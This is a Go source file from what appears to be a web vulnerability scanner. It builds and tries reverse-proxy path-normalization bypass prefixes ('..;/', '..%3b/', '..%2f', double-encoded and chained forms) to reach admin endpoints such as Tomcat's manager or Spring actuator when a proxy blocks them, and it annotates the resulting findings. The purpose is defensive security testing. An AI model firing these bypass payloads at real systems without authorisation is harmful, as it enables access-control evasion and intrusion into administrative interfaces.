package modkit

import (
	"fmt"
	"strings"

	"github.com/vigolium/vigolium/pkg/output"
)

// MaxPathBypassClimb caps how many "/..;/"-style segments a bypass prefix chains.
// Real reverse-proxy mounts / context paths are a handful of segments deep, so a
// few climbs reach root from any realistic launch point; the cap bounds fan-out.
const MaxPathBypassClimb = 3

// pathBypassSingles are single-level reverse-proxy path-normalization bypass
// segments. A fronting proxy (nginx, Apache, an API gateway) that blocks an admin
// path by its literal prefix forwards these because the segment does not match the
// blocked prefix; a Java/Servlet backend (Tomcat, Jetty, Spring Boot) then strips
// the ";"-introduced path parameter and/or decodes the slash and collapses the
// ".." so the request re-reaches the endpoint. Each ends right before the next
// path segment, so the caller appends the endpoint suffix directly.
var pathBypassSingles = []string{
	"..;/",    // matrix-parameter ';' — the Servlet path parameter the proxy didn't strip
	".;/",     // single-dot matrix param — defeats proxies that block ".."
	"..%3b/",  // URL-encoded ';' — defeats proxies blocking the literal semicolon
	"..%23/",  // URL-encoded '#' separator variant
	"..%2f",   // URL-encoded '/' — backend decodes %2f→'/', many proxies do not
	"..%252f", // double-encoded '/' — for a decode-twice proxy→backend chain
}

// pathBypassChainable are the segments worth repeating to climb a multi-segment
// context path or proxy mount (e.g. /..;/..;/manager/html). Only the two highest-
// signal forms are chained so the prefix count stays bounded.
var pathBypassChainable = []string{"..;/", "..%2f"}

// PathBypassPrefixes returns a deduplicated, depth-scaled set of reverse-proxy
// path-normalization bypass prefixes. The caller appends the target endpoint
// suffix (WITHOUT a leading slash, e.g. "manager/html" or "actuator/env") to each
// prefix to form a candidate request path. The result combines:
//
//   - root-anchored single-level encoding variants (pathBypassSingles), which
//     defeat proxies that block by raw prefix without normalizing;
//   - root-anchored multi-level climbs (pathBypassChainable repeated 2..N), where
//     N scales with the observed path depth — "do multiple /..;/..;/ when the URL
//     is deep";
//   - a launch from the observed app directory: climb out of the deepest path the
//     proxy already forwarded for the legitimate request (its allow-rule most
//     likely matches that prefix) back to root, then descend to the target. This
//     covers whitelist proxies that only forward known prefixes.
//
// Order is most-likely-first and stable.
func PathBypassPrefixes(observedPath string) []string {
	maxClimb := pathSegmentCount(observedPath)
	if maxClimb < 1 {
		maxClimb = 1
	}
	if maxClimb > MaxPathBypassClimb {
		maxClimb = MaxPathBypassClimb
	}

	seen := map[string]bool{}
	out := make([]string, 0, len(pathBypassSingles)+2*MaxPathBypassClimb)
	add := func(p string) {
		if p != "" && !seen[p] {
			seen[p] = true
			out = append(out, p)
		}
	}

	for _, s := range pathBypassSingles {
		add("/" + s)
	}
	for n := 2; n <= maxClimb; n++ {
		for _, s := range pathBypassChainable {
			add("/" + strings.Repeat(s, n))
		}
	}
	// Launch from the observed app directory back to root.
	if dir := pathParentDir(observedPath); dir != "" {
		climb := pathSegmentCount(dir)
		if climb > MaxPathBypassClimb {
			climb = MaxPathBypassClimb
		}
		for _, s := range pathBypassChainable {
			add(dir + "/" + strings.Repeat(s, climb))
		}
	}
	return out
}

// IsProxyBlockedStatus reports whether a direct-probe HTTP status looks like a
// fronting proxy's access-control block (401/403/405) rather than a clean
// not-present (404) or a server/transport error. It is the gate for whether a
// path-normalization bypass is worth attempting: a bypass only pays off when
// something IS in front of the endpoint denying the direct path.
func IsProxyBlockedStatus(status int) bool {
	return status == 401 || status == 403 || status == 405
}

// ProbePathBypass drives reverse-proxy path-normalization bypass probing for a
// single endpoint. For each PathBypassPrefixes(observedPath) it assembles
// prefix+endpointSuffix and calls probe — reuse the module's own marker-confirming
// probe so the soft-404 fingerprint, shell guard, marker match and catch-all
// guard all run on the bypass response. The first non-nil finding is annotated as
// a path-normalization bypass and returned; nil when no form reaches the endpoint.
//
// endpointSuffix is the target admin path; a leading slash is tolerated.
func ProbePathBypass(
	observedPath, endpointSuffix string,
	probe func(bypassPath string) *output.ResultEvent,
) *output.ResultEvent {
	return probePathBypassWith(PathBypassPrefixes(observedPath), endpointSuffix, probe)
}

// probePathBypassWith is ProbePathBypass over a precomputed prefix list, so a
// caller probing several endpoints for the same host builds the prefixes once.
func probePathBypassWith(
	prefixes []string,
	endpointSuffix string,
	probe func(bypassPath string) *output.ResultEvent,
) *output.ResultEvent {
	suffix := strings.TrimPrefix(endpointSuffix, "/")
	for _, prefix := range prefixes {
		bypassPath := prefix + suffix
		if res := probe(bypassPath); res != nil {
			AnnotatePathBypassFinding(res, bypassPath)
			return res
		}
	}
	return nil
}

// DriveProbesWithBypass runs the standard base-walk probe loop plus the reverse-
// proxy path-normalization bypass fallback shared by the marker-based path-probe
// modules (Tomcat, the Spring family). It collapses the identical bookkeeping each
// of those modules' ScanPerRequest otherwise hand-rolls: for every (base, probe)
// it calls probe(); then, once per host (the web root "" is present and first only
// on a host's first scan), it tries the bypass forms for each bypass-eligible probe
// whose direct ROOT call returned a proxy-block status (401/403/405) and was not
// already served. Behaviour matches the per-module loops it replaces, including the
// once-per-host gate and the "skip the bypass when the endpoint is already directly
// reachable" rule (a root hit records rootHit, suppressing the redundant bypass).
//
// P is the module's own probe type; the accessor funcs read its fields and probe
// issues the request (the module's probeEndpoint, returning the finding-or-nil and
// the HTTP status). endpointPath is the probe's path; name keys the per-probe
// root-status/hit maps; bypassEligible selects the admin endpoints worth bypassing.
func DriveProbesWithBypass[P any](
	bases []string,
	probes []P,
	observedPath string,
	name func(P) string,
	endpointPath func(P) string,
	bypassEligible func(P) bool,
	probe func(p P, probePath string) (*output.ResultEvent, int),
) []*output.ResultEvent {
	var results []*output.ResultEvent
	rootStatus := map[string]int{}
	rootHit := map[string]bool{}
	for _, base := range bases {
		for _, p := range probes {
			res, status := probe(p, base+endpointPath(p))
			if base == "" {
				rootStatus[name(p)] = status
			}
			if res != nil {
				results = append(results, res)
				if base == "" {
					rootHit[name(p)] = true
				}
			}
		}
	}

	if len(bases) == 0 || bases[0] != "" {
		return results
	}
	prefixes := PathBypassPrefixes(observedPath)
	for _, p := range probes {
		if !bypassEligible(p) || rootHit[name(p)] || !IsProxyBlockedStatus(rootStatus[name(p)]) {
			continue
		}
		pp := p
		if res := probePathBypassWith(prefixes, endpointPath(pp), func(bypassPath string) *output.ResultEvent {
			r, _ := probe(pp, bypassPath)
			return r
		}); res != nil {
			results = append(results, res)
		}
	}
	return results
}

// AnnotatePathBypassFinding marks an already-confirmed finding as reached through a
// reverse-proxy path-normalization bypass: it records the bypass path in the
// evidence, appends the path-normalization / acl-bypass tags and a reference, and
// notes the bypass in the name and description. The module's own marker match and
// FP guards already ran on the bypass response; this only annotates.
func AnnotatePathBypassFinding(res *output.ResultEvent, bypassPath string) {
	if res == nil {
		return
	}
	// Append the bypass marker only when the module set a name inline; a module
	// that leaves Info empty for the runner to fill would otherwise get a stray,
	// space-led " (path-normalization bypass)" with no base name. Such a module
	// should seed Info.Name before annotating (the bypass still shows in the tags,
	// description, and evidence below regardless).
	if res.Info.Name != "" {
		res.Info.Name += " (path-normalization bypass)"
	}
	// Reaching a marker-confirmed endpoint through a path that bypasses a direct
	// 401/403/405 is stronger than mere interface presence: the scanner has
	// demonstrated a reproducible access-control boundary bypass.
	res.RecordKind = output.RecordKindFinding
	res.EvidenceGrade = output.EvidenceGradeBypass
	res.Info.Description = fmt.Sprintf(
		"Reached via the %q reverse-proxy path-normalization bypass: a fronting proxy blocks the direct path, but the Java/Servlet backend strips the ';' path parameter and/or decodes the slash, then collapses the '..' so the request re-reaches the endpoint through the proxy's allow-list. %s",
		bypassPath, res.Info.Description,
	)
	res.Info.Tags = append(res.Info.Tags, "path-normalization", "acl-bypass")
	res.Info.Reference = append(res.Info.Reference,
		"https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf")
	res.ExtractedResults = append([]string{"bypass path: " + bypassPath}, res.ExtractedResults...)
	if res.Metadata == nil {
		res.Metadata = map[string]any{}
	}
	res.Metadata["path_normalization_bypass"] = true
	res.Metadata["bypass_path"] = bypassPath
}

// pathSegmentCount returns the number of non-empty path segments, ignoring any
// query or fragment.
func pathSegmentCount(p string) int {
	if i := strings.IndexAny(p, "?#"); i >= 0 {
		p = p[:i]
	}
	n := 0
	for _, seg := range strings.Split(p, "/") {
		if seg != "" {
			n++
		}
	}
	return n
}

// pathParentDir returns the directory portion of p (its parent path), or "" when p
// is the root or a single segment (no meaningful launch directory). Query and
// fragment are dropped.
func pathParentDir(p string) string {
	if i := strings.IndexAny(p, "?#"); i >= 0 {
		p = p[:i]
	}
	p = strings.TrimRight(p, "/")
	i := strings.LastIndex(p, "/")
	if i <= 0 {
		return ""
	}
	return p[:i]
}
